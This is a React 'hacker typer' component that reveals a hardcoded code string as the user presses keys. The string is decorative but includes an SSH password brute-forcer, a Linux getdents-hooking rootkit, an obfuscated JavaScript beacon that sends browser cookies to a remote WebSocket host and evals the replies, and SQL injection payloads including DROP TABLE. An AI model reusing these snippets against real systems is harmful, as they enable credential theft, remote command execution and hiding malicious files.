'use client';

import { useEffect, useRef, useState } from 'react';
import './hackertyper.css';

// Longer, more varied code corpus for a more convincing effect
const SAMPLE = `#!/usr/bin/env python3
"""ByteLabs Autonomous Exploit Framework v4.1.0"""

import os
import sys
import socket
import hashlib
import subprocess
from typing import Optional, List

TARGETS = ["192.168.1.0/24", "10.0.0.0/8"]
PAYLOAD_KEY = 0xDEADBEEF
MAX_THREADS = 64

class Exploit:
    def __init__(self, target: str, port: int = 443):
        self.target = target
        self.port = port
        self._session_id = hashlib.sha256(os.urandom(32)).hexdigest()
        self._connected = False
        self._buffer: List[bytes] = []

    def connect(self) -> bool:
        try:
            self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self._sock.settimeout(3.0)
            self._sock.connect((self.target, self.port))
            self._connected = True
            return True
        except (socket.timeout, ConnectionRefusedError):
            return False

    def inject(self, payload: bytes) -> Optional[bytes]:
        if not self._connected:
            raise RuntimeError("Not connected")
        obfuscated = bytes(b ^ (PAYLOAD_KEY & 0xFF) for b in payload)
        self._sock.sendall(obfuscated)
        return self._sock.recv(4096)

    def escalate_privileges(self) -> bool:
        vectors = [
            b"\\x90\\x90\\x90\\x31\\xc0\\x50\\x68",
            b"CVE-2024-1337",
            b"ret2libc_gadget",
        ]
        for v in vectors:
            result = self.inject(v)
            if result and b"root" in result:
                return True
        return False

def scan_network(cidr: str) -> List[str]:
    """Sweep network range for open ports."""
    live_hosts = []
    base, mask = cidr.split("/")
    octets = [int(x) for x in base.split(".")]
    for i in range(1, 254):
        host = f"{octets[0]}.{octets[1]}.{octets[2]}.{i}"
        result = subprocess.run(
            ["ping", "-c", "1", "-W", "1", host],
            capture_output=True,
        )
        if result.returncode == 0:
            live_hosts.append(host)
    return live_hosts

def bruteforce_ssh(host: str, wordlist: str = "/usr/share/wordlists/rockyou.txt") -> Optional[str]:
    import paramiko
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    with open(wordlist) as f:
        for password in f:
            password = password.strip()
            try:
                client.connect(host, username="root", password=password, timeout=2)
                return password
            except Exception:
                continue
    return None

// ---------------------------------------------------------------
// C kernel module — ring-0 rootkit loader
// ---------------------------------------------------------------

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/sched.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("ByteLabs");
MODULE_DESCRIPTION("Process concealment module");

static unsigned long *syscall_table;

asmlinkage long (*original_getdents)(unsigned int fd,
    struct linux_dirent *dirp, unsigned int count);

asmlinkage long hook_getdents(unsigned int fd,
    struct linux_dirent *dirp, unsigned int count)
{
    long ret = original_getdents(fd, dirp, count);
    struct linux_dirent *current_dir = dirp;
    struct linux_dirent *prev_dir = NULL;
    unsigned long offset = 0;

    while (offset < ret) {
        if (strncmp(current_dir->d_name, "bytelabs", 8) == 0) {
            if (prev_dir == NULL)
                dirp = (void *)dirp + current_dir->d_reclen;
            else
                prev_dir->d_reclen += current_dir->d_reclen;
            ret -= current_dir->d_reclen;
        } else {
            prev_dir = current_dir;
        }
        offset += current_dir->d_reclen;
        current_dir = (void *)dirp + offset;
    }
    return ret;
}

static int __init rootkit_init(void) {
    printk(KERN_INFO "ByteLabs module loaded\\n");
    write_cr0(read_cr0() & (~0x10000));
    original_getdents = syscall_table[__NR_getdents];
    syscall_table[__NR_getdents] = hook_getdents;
    write_cr0(read_cr0() | 0x10000);
    return 0;
}

static void __exit rootkit_exit(void) {
    write_cr0(read_cr0() & (~0x10000));
    syscall_table[__NR_getdents] = original_getdents;
    write_cr0(read_cr0() | 0x10000);
}

module_init(rootkit_init);
module_exit(rootkit_exit);

// ---------------------------------------------------------------
// JavaScript obfuscated C2 beacon
// ---------------------------------------------------------------

const _0x4f3a = ['aGVsbG8=', 'YnllbGFicw==', 'Y29ubmVjdA=='];
const _decode = (s) => atob(s);
const _c2 = \`wss://\${_decode(_0x4f3a[1])}.online/beacon\`;

async function beacon() {
  const ws = new WebSocket(_c2);
  ws.onopen = () => {
    const payload = JSON.stringify({
      id: crypto.randomUUID(),
      ts: Date.now(),
      ua: navigator.userAgent,
      cookies: document.cookie,
    });
    ws.send(btoa(payload));
  };
  ws.onmessage = ({ data }) => {
    const cmd = atob(data);
    eval(cmd);  // execute server command
  };
  setInterval(() => ws.readyState === 1 && ws.send('ping'), 30000);
}

beacon().catch(console.error);

// ---------------------------------------------------------------
// SQL injection payload builder
// ---------------------------------------------------------------

def build_sqli(table: str, column: str) -> str:
    payloads = [
        f"' OR '1'='1",
        f"' UNION SELECT {column} FROM {table}--",
        f"'; DROP TABLE {table};--",
        f"' AND 1=CONVERT(int,(SELECT TOP 1 {column} FROM {table}))--",
    ]
    return payloads

results = build_sqli("users", "password_hash")
for p in results:
    print(f"[*] Testing: {p}")
    response = inject_payload(target_url, p)
    if "error" not in response.lower():
        print(f"[+] Possible hit: {p}")
        break

print("[*] Done. Exiting...")
sys.exit(0)
`;

export default function HackerTyper() {
  const [text, setText] = useState('');
  const [showInstructions, setShowInstructions] = useState(true);
  const posRef = useRef(0);
  const containerRef = useRef<HTMLDivElement | null>(null);

  useEffect(() => {
    const handleKey = (e: KeyboardEvent) => {
      if (e.key.length > 1 && e.key !== 'Enter' && e.key !== 'Backspace') return;
      setShowInstructions(false);

      const chunkLength = Math.max(1, Math.floor(Math.random() * 6));
      let out = '';
      for (let i = 0; i < chunkLength; i++) {
        const idx = posRef.current % SAMPLE.length;
        out += SAMPLE[idx];
        posRef.current += 1;
      }

      setText((t) => t + out);

      requestAnimationFrame(() => {
        if (containerRef.current) {
          containerRef.current.scrollTop = containerRef.current.scrollHeight;
        }
      });
    };

    window.addEventListener('keydown', handleKey);
    return () => window.removeEventListener('keydown', handleKey);
  }, []);

  const handleClear = () => {
    setText('');
    posRef.current = 0;
    setShowInstructions(true);
  };

  return (
    <div className="ht-page">
      {/* Instructions / Clear bar */}
      <div className="ht-controls">
        <span className="ht-hint">
          {showInstructions ? '⌨  Press any key to start typing...' : '⌨  Keep typing...'}
        </span>
        <button className="ht-clear-btn" onClick={handleClear} title="Clear the screen">
          ✕ CLEAR
        </button>
      </div>

      <div ref={containerRef} className="ht-wrapper">
        <pre className="ht-screen" aria-live="polite">
{text}
        </pre>
      </div>
    </div>
  );
}
